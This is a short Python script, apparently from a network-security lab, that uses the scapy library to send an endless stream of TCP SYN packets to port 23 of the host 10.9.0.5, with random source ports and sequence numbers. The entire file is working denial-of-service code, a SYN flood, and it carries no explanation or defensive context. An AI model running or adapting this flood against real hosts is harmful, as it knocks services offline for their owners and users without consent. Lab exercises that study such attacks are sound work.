#!/bin/env python3

from scapy.all import IP, TCP, send
from ipaddress import IPv4Address
from random import getrandbits
import random

dst_ip = "10.9.0.5"
src_ip = "10.0.2.15"

ip = IP(dst=dst_ip)
tcp = TCP(dport=23, flags="S")
pkt = ip/tcp

while True:

    pkt[IP].src = src_ip
    pkt[TCP].sport = getrandbits(16)%(65535-1024) + 1024
    pkt[TCP].seq = getrandbits(32)
    send(pkt, verbose=0)

